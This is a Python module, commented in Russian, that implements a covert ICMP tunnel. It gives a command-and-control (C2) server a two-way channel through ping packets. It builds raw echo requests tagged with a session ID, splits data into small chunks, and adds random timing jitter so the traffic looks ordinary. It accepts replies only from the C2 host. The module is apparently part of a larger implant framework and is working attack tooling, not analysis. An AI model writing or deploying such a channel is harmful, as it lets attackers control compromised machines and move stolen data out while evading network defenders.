#!/usr/bin/env python3
"""
ICMP Tunnel Module - Модуль для скрытой передачи данных через ICMP-пакеты (ping)
Обеспечивает двусторонний канал связи с C2-сервером через ping-запросы
"""

import os
import time
import socket
import struct
import random
import select
from ..common.utils import get_logger
import logging
import threading
import binascii
from typing import Dict, List, Any, Optional, Tuple, Union, Callable

# Для работы модуля требуются привилегии администратора/root
# Для Windows: необходим pydivert или аналогичная библиотека для RAW сокетов
# Для Linux: достаточно root-доступа

class ICMPTunnel:
    """
    Класс для реализации ICMP-туннелирования
    Позволяет передавать данные через ICMP Echo Request/Reply пакеты
    """
    
    # Типы и коды ICMP пакетов
    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0
    
    def __init__(
        self,
        c2_host: str = "192.168.1.1",
        session_id: str = None,
        poll_interval: float = 1.0,
        jitter: float = 0.3,
        max_chunk_size: int = 32,
        callback: Optional[Callable[[bytes], None]] = None
    ):
        """
        Инициализация ICMP-туннеля
        
        Args:
            c2_host: IP-адрес C2-сервера
            session_id: Идентификатор сессии (генерируется автоматически, если не указан)
            poll_interval: Интервал между запросами (секунды)
            jitter: Случайное отклонение для интервала (доля от интервала)
            max_chunk_size: Максимальный размер чанка для передачи
            callback: Колбэк для обработки полученных данных
        """
        self.c2_host = c2_host
        self.session_id = session_id or self._generate_session_id()
        self.poll_interval = poll_interval
        self.jitter = jitter
        self.max_chunk_size = max_chunk_size
        self.callback = callback
        
        # Для идентификации и последовательности ICMP пакетов
        self.sequence = 0
        self.is_running = False
        self.receive_thread = None
        self.icmp_socket = None
        
        # Настройка логирования
        self.logger = get_logger("icmp_tunnel")
        
        # Счетчики и статистика
        self.stats = {
            "sent_packets": 0,
            "received_packets": 0,
            "sent_bytes": 0,
            "received_bytes": 0,
            "errors": 0,
            "start_time": time.time()
        }
    
    def _generate_session_id(self) -> str:
        """Генерирует уникальный идентификатор сессии"""
        return binascii.hexlify(os.urandom(2)).decode()
    
    def _create_socket(self) -> bool:
        """Создает RAW-сокет для ICMP"""
        try:
            # ICMP приходится реализовывать через RAW-сокет
            if os.name == "nt":  # Windows
                # На Windows для RAW-сокетов нужны дополнительные библиотеки
                self.icmp_socket = socket.socket(
                    socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP
                )
            else:  # Linux/Unix/Mac
                self.icmp_socket = socket.socket(
                    socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP
                )
                
            self.icmp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
            self.icmp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            self.icmp_socket.setblocking(0)  # Неблокирующий режим
            
            return True
        except PermissionError:
            self.logger.error("Для создания ICMP-сокета требуются права администратора/root")
            return False
        except Exception as e:
            self.logger.error(f"Ошибка создания ICMP-сокета: {e}")
            return False
    
    def _calculate_checksum(self, data: bytes) -> int:
        """
        Вычисляет контрольную сумму для ICMP-пакета
        
        Args:
            data: Данные для расчета контрольной суммы
            
        Returns:
            int: Значение контрольной суммы
        """
        checksum = 0
        
        # Обрабатываем данные по 2 байта
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                checksum += (data[i] << 8) + data[i + 1]
            else:
                checksum += data[i] << 8
        
        # Складываем старшие и младшие 16 бит
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        
        # Берем дополнение до 1
        return ~checksum & 0xFFFF
    
    def _create_icmp_packet(self, data: bytes, seq: int = 0) -> bytes:
        """
        Создает ICMP-пакет с данными
        
        Args:
            data: Данные для включения в пакет
            seq: Номер последовательности
            
        Returns:
            bytes: ICMP-пакет с данными
        """
        # Преобразуем session_id в байты
        session_id_bytes = bytes.fromhex(self.session_id)
        
        # ICMP заголовок: тип (8 = echo request), код (0), контрольная сумма, 
        # идентификатор (session_id), номер последовательности
        icmp_type = self.ICMP_ECHO_REQUEST
        icmp_code = 0
        icmp_checksum = 0  # Временно для расчета
        icmp_id = int.from_bytes(session_id_bytes, byteorder='big')
        icmp_seq = seq
        
        # Формируем заголовок без контрольной суммы
        header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        # Формируем полный пакет
        packet = header + data
        
        # Вычисляем контрольную сумму и обновляем пакет
        checksum = self._calculate_checksum(packet)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
        packet = header + data
        
        return packet
    
    def _parse_icmp_packet(self, packet: bytes) -> Tuple[bool, Optional[bytes]]:
        """
        Разбирает ICMP-пакет и извлекает данные
        
        Args:
            packet: ICMP-пакет для разбора
            
        Returns:
            Tuple[bool, Optional[bytes]]: Успешность разбора и извлеченные данные
        """
        try:
            # Минимальная длина для ICMP-пакета
            if len(packet) < 28:  # 20 (IP header) + 8 (ICMP header)
                return False, None
            
            # Пропускаем IP-заголовок (обычно 20 байт)
            icmp_packet = packet[20:]
            
            # Разбираем ICMP-заголовок
            icmp_type, icmp_code, _, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_packet[:8])
            
            # Проверяем, что это echo reply и ID соответствует нашей сессии
            session_id_bytes = bytes.fromhex(self.session_id)
            expected_id = int.from_bytes(session_id_bytes, byteorder='big')
            
            if icmp_type == self.ICMP_ECHO_REPLY and icmp_id == expected_id:
                # Извлекаем данные из пакета
                data = icmp_packet[8:]
                return True, data
            
            return False, None
            
        except Exception as e:
            self.logger.error(f"Ошибка при разборе ICMP-пакета: {e}")
            return False, None
    
    def start(self) -> bool:
        """Запускает ICMP-туннель"""
        if self.is_running:
            return False
        
        # Создаем сокет
        if not self._create_socket():
            return False
            
        self.is_running = True
        self.receive_thread = threading.Thread(
            target=self._receive_loop,
            daemon=True,
            name="ICMP-Tunnel-Receiver"
        )
        self.receive_thread.start()
        
        self.logger.info(f"ICMP-туннель запущен с сессией {self.session_id}")
        return True
    
    def stop(self) -> None:
        """Останавливает ICMP-туннель"""
        self.is_running = False
        
        if self.icmp_socket:
            try:
                self.icmp_socket.close()
            except:
                pass
            self.icmp_socket = None
            
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=3)
        
        self.logger.info("ICMP-туннель остановлен")
    
    def send(self, data: bytes) -> bool:
        """
        Отправляет данные через ICMP-туннель
        
        Args:
            data: Бинарные данные для отправки
            
        Returns:
            bool: Успешность операции
        """
        if not self.is_running or not self.icmp_socket:
            return False
        
        # Разбиваем данные на чанки подходящего размера
        chunks = [data[i:i+self.max_chunk_size] for i in range(0, len(data), self.max_chunk_size)]
        
        success = True
        for i, chunk in enumerate(chunks):
            try:
                # Создаем ICMP-пакет
                seq = self.sequence + i
                packet = self._create_icmp_packet(chunk, seq)
                
                # Отправляем пакет
                self.icmp_socket.sendto(packet, (self.c2_host, 0))
                
                # Обновляем статистику
                self.stats["sent_packets"] += 1
                self.stats["sent_bytes"] += len(chunk)
                
                # Добавляем случайную задержку для имитации реального трафика
                jitter_value = self.poll_interval * self.jitter * random.uniform(-1, 1)
                time.sleep(max(0.1, (self.poll_interval + jitter_value) / len(chunks)))
                
            except Exception as e:
                self.logger.error(f"Ошибка при отправке ICMP-пакета: {e}")
                self.stats["errors"] += 1
                success = False
        
        self.sequence += len(chunks)
        return success
    
    def _receive_loop(self) -> None:
        """Цикл приема данных через ICMP-туннель"""
        buffer_size = 65536  # Максимальный размер буфера для приема пакетов
        
        while self.is_running and self.icmp_socket:
            try:
                # Ожидаем данные на сокете с таймаутом
                ready, _, _ = select.select([self.icmp_socket], [], [], 0.5)
                
                if ready:
                    # Получаем пакет
                    packet, addr = self.icmp_socket.recvfrom(buffer_size)
                    
                    # Проверяем, от нашего ли C2-сервера пакет
                    if addr[0] == self.c2_host:
                        # Разбираем пакет
                        success, data = self._parse_icmp_packet(packet)
                        
                        if success and data:
                            # Обновляем статистику
                            self.stats["received_packets"] += 1
                            self.stats["received_bytes"] += len(data)
                            
                            # Вызываем колбэк для обработки полученных данных
                            if self.callback:
                                self.callback(data)
                
                # Добавляем случайную задержку для имитации реального трафика
                jitter_value = self.poll_interval * self.jitter * random.uniform(-1, 1)
                time.sleep(max(0.1, self.poll_interval + jitter_value) / 10)  # Делим на 10 для более частых проверок
                
            except select.error:
                # Ошибка в select, возможно, сокет закрыт
                break
            except Exception as e:
                self.logger.error(f"Ошибка в цикле приема ICMP: {e}")
                self.stats["errors"] += 1
                time.sleep(0.5)  # Небольшая пауза перед следующей попыткой
    
    def get_statistics(self) -> Dict[str, Any]:
        """Возвращает текущую статистику работы туннеля"""
        stats = self.stats.copy()
        stats["is_running"] = self.is_running
        stats["session_id"] = self.session_id
        stats["sequence"] = self.sequence
        stats["uptime"] = time.time() - self.stats["start_time"]
        
        return stats

# Тестирование модуля (требует прав администратора)
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    def data_callback(data: bytes) -> None:
        print(f"Получены данные: {data}")
    
    # Для тестирования используем localhost
    tunnel = ICMPTunnel(
        c2_host="127.0.0.1",
        callback=data_callback
    )
    
    if tunnel.start():
        try:
            # Отправляем тестовое сообщение
            tunnel.send(b"Hello from ICMP tunnel!")
            time.sleep(10)  # Даем время на обработку
            
            # Выводим статистику
            stats = tunnel.get_statistics()
            print(f"Отправлено пакетов: {stats['sent_packets']}")
            print(f"Получено пакетов: {stats['received_packets']}")
            print(f"Отправлено байт: {stats['sent_bytes']}")
            print(f"Получено байт: {stats['received_bytes']}")
            print(f"Ошибок: {stats['errors']}")
        finally:
            tunnel.stop()
    else:
        print("Не удалось запустить ICMP-туннель. Проверьте права администратора/root.") 